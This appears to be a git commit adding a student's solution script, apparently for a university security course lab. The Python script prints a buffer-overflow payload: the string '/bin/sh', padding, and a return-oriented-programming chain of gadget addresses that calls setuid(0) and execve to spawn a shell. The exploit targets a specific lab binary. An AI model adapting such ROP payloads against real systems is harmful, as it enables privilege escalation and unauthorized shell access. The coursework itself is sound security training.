c6751fb501fb254626c60750b437d6be458a7c31
yijo2004 <yijo@umich.edu>
2024-04-03 05:05:44 +0000

    FINISHED

--- sol7.py
+++ sol7.py
@@ -1,4 +1,20 @@
 #!/usr/bin/env python3
 
 import sys
-
+# sys.stdout.buffer.write(b'A' * 100000)
+sys.stdout.buffer.write(b'/bin/sh\x00')
+sys.stdout.buffer.write(b'A'*112)
+sys.stdout.buffer.write(0x0000000000456587.to_bytes(8, 'little'))
+sys.stdout.buffer.write(int(105).to_bytes(8, 'little')) 
+sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little'))
+sys.stdout.buffer.write(int(0).to_bytes(8, 'little')) 
+sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, 'little')) 
+sys.stdout.buffer.write(0x000000000048c0aa.to_bytes(8, 'little')) 
+sys.stdout.buffer.write(int(59).to_bytes(8, 'little'))
+sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
+sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff69550.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x000000000040a57e.to_bytes(8, 'little')) 
+sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, 'little')) 
